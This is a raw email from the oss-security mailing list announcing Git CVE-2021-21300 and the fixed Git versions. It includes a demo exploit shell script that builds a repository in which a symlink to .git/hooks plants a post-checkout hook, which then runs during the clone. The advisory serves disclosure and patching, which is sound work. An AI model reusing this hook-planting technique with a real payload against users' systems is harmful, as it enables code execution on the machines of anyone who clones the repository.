X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1569" "Tuesday" "9" "March" "2021" "16:03:37" "+0100" "Johannes Schindelin" "Johannes.Schindelin@gmx.de" nil "57" "[oss-security] git: malicious repositories can execute remote code while cloning" nil nil nil "3" nil nil (number mark "U       Johannes.Sch Mar  9   57/1569  " thread-indent "\"[oss-security] git: malicious repositories can execute remote code while cloning\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] git: malicious repositories can execute remote code while cloning" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 14081 invoked by uid 550); 9 Mar 2021 20:55:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7906 invoked from network); 9 Mar 2021 20:40:26 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=gmx.net;
	s=badeba3b8450; t=1615322413;
	bh=JgUw87DStQ6BREdE91nL3sl+aedLb8w2dMKac/QT8lc=;
	h=X-UI-Sender-Class:Date:From:To:cc:Subject;
	b=dMp5EbRgpNXTHN8sqdGQzBgRoaZD+qdotYmTvZ/cu0nVCrIVv/gpL8f/9y3Hzbkmw
	 QTXu1RQfh75Y/3YXLheueaHFq3eqh/WbNEtB6nFmwcq6Tbc1QVF+EGv9AqggM/uxJr
	 FSOyxjQrLaSlEoqbnoG5h2ZERlUT8abz0SKUm4P0=
X-UI-Sender-Class: 01bb95c1-4bf8-414a-932a-4f6e2808ef9c
Date: Tue, 9 Mar 2021 16:03:37 +0100 (CET)
From: Johannes Schindelin <Johannes.Schindelin@gmx.de>
X-X-Sender: virtualbox@gitforwindows.org
To: oss-security@lists.openwall.com
cc: git-security@googlegroups.com, Matheus Tavares <matheus.bernardino@usp.br>
Message-ID: <nycvar.QRO.7.76.6.2103091555260.50@tvgsbejvaqbjf.bet>
User-Agent: Alpine 2.21.1 (DEB 209 2017-03-23)
MIME-Version: 1.0
Content-Type: text/plain; CHARSET=US-ASCII
Content-ID: <nycvar.QRO.7.76.6.2103091555281.50@tvgsbejvaqbjf.bet>
X-Provags-ID: V03:K1:jPKkipnIA3Ty8o1zttWwk/uzzF0v8/0W2xEFBUW+nUe6uBtvNwX
 0srw9xqMPgdOnecrdjRMIFKHSXCJWbfJ+SQpMqP0WVPOeduh8BSNo7yuZu3qoloMlosZM5L
 x1AWdw/hxIkyFtzktQx2PxS9nTFW2bpqszrCChxSjSk29UEgmCo12aHa2Z+RnHP7Oy4cyrl
 InT7BAelmR8gRATKg8w4Q==
X-UI-Out-Filterresults: notjunk:1;V03:K0:qi74JA3QShY=:ohCcIAJNaAtKor1IakU9Z6
 6uyuxOHzjRexesolzObNJkXfx4MaBMUV7LA/JqSOW0jWovYqIJstDJBxIrB9c5r8pywwOYA/t
 B6cs3DTYqFO+7+b3TRj9VgoNYU1oam5jfkEPfMEKvXII/DLTHkcQ2XE5QTd0EhesiGdEWK5tV
 mI2VMa81CYwvg3rF+HNQOgqKYVdGwjjeSFryue8dVQZ5et8dY6rte6aBbBeotNL5F5fLZ8PsK
 +TDJ9wAIvar3VubuXYXCv7m/tCKdS0ULHMmyb1Mv9SY2lZP9aUdgXBciVp7lyF7EyTeOMUsbH
 CzOCa5o2FMaTaKJdmHlNiJvV2cE4FOsPoF9BB4n9LovxG7BxEVUW2UjGFdb1b4o2AaRWJklzp
 CTMBttH7qFce3KxXwAJw7bEQzhqxOZiuoYaNrSX6xNQYKVyYIdF7HiF9T5GX5iidoPBLwp/Hy
 F2FCCnBpyXhMQ8DyxMFWQKaTWxJCh4Ghtou+Y7np0snds0KSP1mvMp+sErujnLytCxLioBy8n
 Vep1aJrrt+IprwIGn/QI3fSOivmF3thMwV9fZOG24EPKfvHRyTyMyVJ7wjy6rKmBDUxcovy4M
 8UA0YuymNoclApDa/fIqjLXpUSq4pnLAsqlr2ZhbWNR03YToSUbgpTI80qM6S5Wgu8BlnrPda
 exaK/pID3TwuU3g5PsyKsnmY2o9+8T3lTb0XeTW52jWpM3hi44Se/nO7LtWwpz0Wb4Y8DxGW5
 OY/UPm5gjV79s+VSbb6crFBNkgRDuAl7iNXffdDoxeIt5g9MMTWkn6q7OB8pw9bgYF9M+kPdA
 rXBcQ4WKlTqf5HOlNK+MYktceqDM7kIpN4wtrwlfsxWreE/FofuhzAfwiqQUpsu9CtQJv0VOb
 Q0zr82wSk3YFe2i14gXZTdYTZk5krrhFmi22GDYVQ=
Subject: [oss-security] git: malicious repositories can execute remote code while cloning

Team,

The Git project released new versions on Tuesday, March 9th 2021
addressing CVE-2021-21300.

This vulnerability affects platforms with case-insensitive filesystems
with support for symbolic links, when certain clean/smudge filters are
configured globally (e.g. Git LFS).

The fixed versions are v2.17.6, v2.18.5, v2.19.6, v2.20.5, v2.21.4,
v2.22.5, v2.23.4, v2.24.4, v2.25.5, v2.26.3, v2.27.1, v2.28.1, v2.29.3,
and v2.30.2.

Link to the announcement:
https://lore.kernel.org/git/xmqqim6019yd.fsf@gitster.c.googlers.com/T/#u

We highly recommend to upgrade.

The addressed issue is:

* CVE-2021-21300:
  On case-insensitive filesystems, with support for symbolic links,
  if Git is configured globally to apply delay-capable clean/smudge
  filters (such as Git LFS), Git could be fooled into running
  remote code during a clone.

  Demo exploit:

  #!/bin/sh

  git init delayed-checkout &&
  (
  	cd delayed-checkout &&
  	echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
  		>.gitattributes &&
  	mkdir A &&
  	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
  	chmod +x A/post-checkout &&
  	>A/a &&
  	>A/b &&
  	git add -A &&
  	rm -rf A &&
  	ln -s .git/hooks a &&
  	git add a &&
  	git commit -m initial
  ) &&
  git clone delayed-checkout cloned

  With Git LFS enabled globally, this will print "PWNED" during the clone
  on case-insensitive file systems with support for symbolic links (such
  as NTFS, HFS+, etc).

Credit for finding the vulnerability goes to Matheus Tavares who also
worked with me on fixing it.

Thanks,
Johannes
